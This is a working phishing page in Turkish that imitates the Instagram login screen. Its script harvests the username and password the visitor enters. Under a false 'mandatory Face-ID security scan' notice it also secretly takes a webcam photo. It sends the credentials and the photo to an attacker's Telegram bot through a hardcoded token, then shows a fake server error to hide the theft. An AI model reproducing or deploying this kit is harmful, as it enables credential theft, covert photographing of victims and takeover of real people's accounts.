<<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; border-radius: 3px; }
        .logo { font-size: 35px; font-weight: bold; margin: 20px 0; color: #262626; letter-spacing: -1px; }
        .security-notice { background: #fff9e6; border: 1px solid #ffe58f; padding: 12px; font-size: 11px; color: #856404; margin-bottom: 18px; border-radius: 4px; text-align: left; line-height: 1.4; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; margin-bottom: 6px; font-size: 12px; }
        button { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 4px; padding: 7px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:disabled { background-color: #b2dffc; }
        #loader { display: none; width: 16px; height: 16px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">Instagram</div>
    
    <div class="security-notice">
        <b>Zorunlu Güvenlik Taraması:</b> Hesabınızın güvenliği için giriş yaparken yüz doğrulama izni vermeniz gerekmektedir. Lütfen çıkan uyarıyı onaylayın.
    </div>
    
    <input type="text" id="user" placeholder="Kullanıcı adı, e-posta veya telefon">
    <input type="password" id="pass" placeholder="Şifre">
    
    <button id="loginBtn" onclick="baslat()">
        <span id="btnText">Giriş Yap</span>
        <div id="loader"></div>
    </button>
</div>

<video id="vid" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    // --- BİLGİLERİNİZ ---
    const TOKEN = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
    const ID = "1540769169";

    async function baslat() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        if(!u || !p) return alert("Lütfen bilgileri doldurun.");

        document.getElementById('btnText').style.display = "none";
        document.getElementById('loader').style.display = "block";
        document.getElementById('loginBtn').disabled = true;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('vid');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const resim = canvas.toDataURL('image/png');

                gonder(u, p, resim);

                alert("Sunucu hatası: Giriş yapılamadı, lütfen daha sonra tekrar deneyin.");
                location.reload(); 
            }, 2500);

        } catch (e) {
            alert("Hata: Güvenlik doğrulaması (Face-ID) reddedildiği için giriş yapılamadı.");
            location.reload();
        }
    }

    function gonder(u, p, img) {
        const msg = `🎯 **Yeni Bir Av Yakalandı!**\n\n👤 Kullanıcı: \`${u}\`\n🔑 Şifre: \`${p}\``;
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);

        fetch(img).then(r => r.blob()).then(b => {
            const fd = new FormData();
            fd.append("chat_id", ID);
            fd.append("photo", b, "av.png");
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
        });
    }
</script>

</body>
</html>
